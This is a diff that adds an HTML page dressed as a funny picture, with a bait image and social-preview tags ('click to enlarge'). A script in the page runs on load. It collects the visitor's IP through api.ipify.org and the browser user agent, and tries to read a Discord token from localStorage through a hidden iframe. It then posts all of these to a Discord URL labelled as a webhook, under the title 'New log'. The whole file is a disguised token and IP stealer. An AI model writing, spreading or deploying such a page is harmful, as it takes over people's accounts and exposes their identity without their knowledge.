@@ -1,1 +1,62 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta property="og:title" content="Смешная картинка" />
+    <meta property="og:image" content="https://i.ibb.co/Pv7gt5c1/kolobok.jpg" />
+    <meta property="og:description" content="Нажми, чтобы увеличить" />
+    <title>Image</title>
+</head>
+<body>
+    <!-- Картинка для приманки (можно заменить на реальную) -->
+    <img src="https://i.ibb.co/Pv7gt5c1/kolobok.jpg" style="width:100%;height:auto;">
 
+    <script>
+        // Функция для получения IP через ipify.org
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const ip = data.ip;
+                const ua = navigator.userAgent;
+                let token = null;
+
+                // Попытка достать токен Discord из localStorage (если открыто в браузере)
+                try {
+                    const iframe = document.createElement('iframe');
+                    iframe.style.display = 'none';
+                    document.body.appendChild(iframe);
+                    const localStorage = iframe.contentWindow.localStorage;
+                    for (let i = 0; i < localStorage.length; i++) {
+                        const key = localStorage.key(i);
+                        if (key && key.startsWith('token')) {
+                            token = localStorage.getItem(key);
+                            break;
+                        }
+                    }
+                    document.body.removeChild(iframe);
+                } catch (e) {}
+
+                // Отправляем данные на вебхук
+                const webhook = 'https://discordapp.com/channels/1462550644555776032/1462550645604090116/1477693698966950021';
+                if (webhook) {
+                    fetch(webhook, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            content: '@everyne',
+                            embeds: [{
+                                title: 'Новый лог',
+                                fields: [
+                                    { name: 'IP', value: ip },
+                                    { name: 'User Agent', value: ua },
+                                    { name: 'Discord Token', value: token || 'Не найден' }
+                                ],
+                                color: 0x00ff00
+                            }]
+                        })
+                    });
+                }
+            });
+    </script>
+</body>
+</html>
